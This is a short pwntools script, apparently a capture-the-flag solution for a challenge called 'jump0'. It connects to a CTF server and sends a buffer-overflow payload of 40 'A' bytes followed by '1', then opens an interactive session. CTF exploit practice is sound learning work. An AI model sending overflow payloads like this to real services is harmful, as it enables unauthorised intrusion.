from pwn import *

p = process('./dist/jump0')
elf = p.elf
p = remote('cbactf.com', 5002)

p.sendline(40 * b'A' + b'1')
p.interactive()
